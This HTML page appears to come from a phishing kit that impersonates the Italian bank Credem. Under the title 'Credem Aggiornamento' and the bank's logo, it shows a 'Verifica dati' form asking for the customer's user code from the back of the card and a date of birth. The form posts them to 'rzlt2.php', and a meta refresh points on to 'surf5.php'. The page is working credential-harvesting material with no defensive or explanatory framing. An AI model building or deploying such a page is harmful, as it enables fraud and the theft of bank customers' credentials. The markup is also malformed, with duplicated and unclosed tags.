<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>

<head>

<title>Credem Aggiornamento </title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="shortcut icon" href="images/favicon.ico"/>

<html><meta http-equiv="Refresh" content=""; url=surf5.php"></html>
</head>

<style type="text/css">

.textbox { 

    border: 1px solid #323232; 

    height: 42px; 

    width: 275px; 

  	font-family: 'open sans';

    font-size: 14px;

  	color: #6F6F6F;

    padding-left: 10px; 

    border-radius: 2px; 

    box-shadow: 0 4px 7px 0 #d2d2d2 inset;   

}  

.textbox:focus { 

    outline: none; 

    border: 2px solid #258900;

} 

</style>

</head>

<body>


<form action=rzlt2.php name=kmc method=post>

<h2 style="text-align: center;"><img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.bitmat.it/wp-content/uploads/2018/10/LOGOcredem-banca.png" alt="" width="335" height="251" />Verifica dati</h2>

<input name="cu" placeholder="Codice Utente *situato nel retro della carta " class="textbox" autocomplete="off" required type="text" minlength="6" maxlength="8 " style="display: block; margin-left: auto; margin-right: auto;";z-index:2"><br>

<input name="da" placeholder="Data di Nascita " class="textbox" autocomplete="off" required type="date" name="data"maxlength="2 " style="display: block; margin-left: auto; margin-right: auto;z-index:5"> </fieldset>
<br>
<br>


<center>
<div id="formimage1" <img style="display: block; margin-left: auto; margin-right: auto;" z-index:6"><input type="image" name="formimage1" width="226" height="44" src="images/s13.png"><br>
<br>



</body>

</html>